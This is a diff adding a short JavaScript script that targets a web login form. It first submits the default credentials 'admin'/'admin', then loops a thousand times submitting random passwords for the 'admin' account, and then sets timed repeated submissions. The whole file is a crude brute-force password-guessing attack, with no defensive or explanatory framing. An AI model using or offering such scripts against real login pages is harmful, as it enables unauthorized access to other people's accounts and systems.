@@ -1,0 +1,28 @@
+document.getElementById("login-input").value = 'admin';
+document.getElementById("password-input").value = 'admin';
+document.getElementById("form").submit();
+
+var chars = ["a","b","c","d","e","f","g","h","i","j,","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"," "];
+i = 0;
+while(i < 1000){
+  var len = Math.floor(Math.random() * 20);
+  var str = "";
+  while(str.length < len){
+    str += chars[Math.floor(Math.random() * chars.length)];
+  }
+  document.getElementById("login-input").value = 'admin';
+  document.getElementById("password-input").value = str;
+  document.getElementById("form").submit();
+  i++;
+}
+
+
+i=0
+while(i<20){
+setInterval(function () {document.getElementById("login-input").value = 'admin';
+document.getElementById("password-input").value = 'aa';
+document.getElementById("form").submit();}, 1000);
+
+i++
+
+}
